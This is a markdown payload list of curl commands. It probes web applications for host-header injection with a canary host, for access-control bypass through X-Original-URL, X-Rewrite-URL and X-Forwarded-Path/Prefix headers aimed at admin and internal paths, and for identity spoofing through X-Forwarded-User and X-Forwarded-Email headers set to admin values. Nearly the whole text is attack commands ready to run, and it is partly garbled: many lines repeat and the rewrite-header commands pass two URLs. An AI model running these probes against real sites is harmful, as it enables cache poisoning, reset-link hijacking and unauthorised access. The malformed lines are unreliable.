# Payload variants — every host-header payload variant, exhaustively

The payload-variant map — a header, a payload family, a canary.

---

## 1. Host — the canonical host header

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'Host: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/internal" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/admin" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/user" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/debug" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/preview" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/private" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/internal" | grep -i 'location\|set-cookie'
```

## 2. X-Forwarded-Host — the forwarded host header

```bash
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -H 'X-Forwarded-Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/api/internal" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/api/admin" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/api/user" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/api/debug" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/api/preview" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/api/private" | grep -i 'location\|set-cookie'
```

## 3. X-Host — the forwarded host header

```bash
curl -s -D - -H 'X-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -H 'X-Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'X-Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Host: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Host: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Host: canary.example' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/api/internal" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/api/admin" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/api/user" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/api/debug" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/api/preview" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/api/private" | grep -i 'location\|set-cookie'
```

## 4. X-Forwarded-Server — the forwarded server header

```bash
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -H 'X-Forwarded-Server: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/api/internal" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/api/admin" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/api/user" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/api/debug" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/api/preview" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/api/private" | grep -i 'location\|set-cookie'
```

## 5. X-HTTP-Host-Override — the forwarded host header

```bash
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -H 'X-HTTP-Host-Override: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/api/internal" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/api/admin" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/api/user" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/api/debug" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/api/preview" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/api/private" | grep -i 'location\|set-cookie'
```

## 6. X-Forwarded-Proto — the forwarded proto header

```bash
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: http, https' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
```

## 7. X-Forwarded-Scheme — the forwarded scheme header

```bash
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
```

## 8. X-Forwarded-Port — the forwarded port header

```bash
curl -s -D - -H 'X-Forwarded-Port: 80' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 443' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 80' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 443' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 80' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 443' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 80' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 443' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 80' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 443' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 80' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 443' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 80' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 443' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Port: 80' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 443' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 80' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 443' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Port: 8080' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
```

## 9. X-Forwarded-Path — the forwarded path header

```bash
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Path: /api/preview' "$BASE/" # 200 with the api preview body = finding
```

## 10. X-Forwarded-Prefix — the forwarded prefix header

```bash
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Forwarded-Prefix: /api/preview' "$BASE/" # 200 with the api preview body = finding
```

## 11. X-Forwarded-User — the forwarded user header

```bash
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-User: root' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-User: root' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-User: root' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-User: root' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-User: root' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-User: root' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-User: root' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-User: root' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-User: root' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
```

## 12. X-Forwarded-Email — the forwarded email header

```bash
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Email: user@target.com' "$BASE/page" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Email: user@target.com' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Email: user@target.com' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Email: user@target.com' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Email: user@target.com' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Email: user@target.com' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Email: user@target.com' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Email: user@target.com' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Email: user@target.com' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
```

## 13. Forwarded — the RFC 7239 forwarded header

```bash
curl -s -H 'Forwarded: host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;for=127.0.0.1' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=https' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=::1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=10.0.0.1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: host=canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: host=canary.example;for=127.0.0.1' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: host=canary.example;proto=http' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=https' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: for=::1;host=canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: for=10.0.0.1;host=canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
```

## 14. X-Original-URL — the rewrite URL header

```bash
curl -i "$BASE/admin" -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api' "$BASE/" # 200 with the api body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Original-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
```

## 15. X-Rewrite-URL — the rewrite URL header

```bash
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api' "$BASE/" # 200 with the api body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Rewrite-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
```

## 16. X-Original-Path — the rewrite path header

```bash
curl -i "$BASE/admin" -H 'X-Original-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api' "$BASE/" # 200 with the api body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Original-Path: /api/preview' "$BASE/" # 200 with the api preview body = finding
```

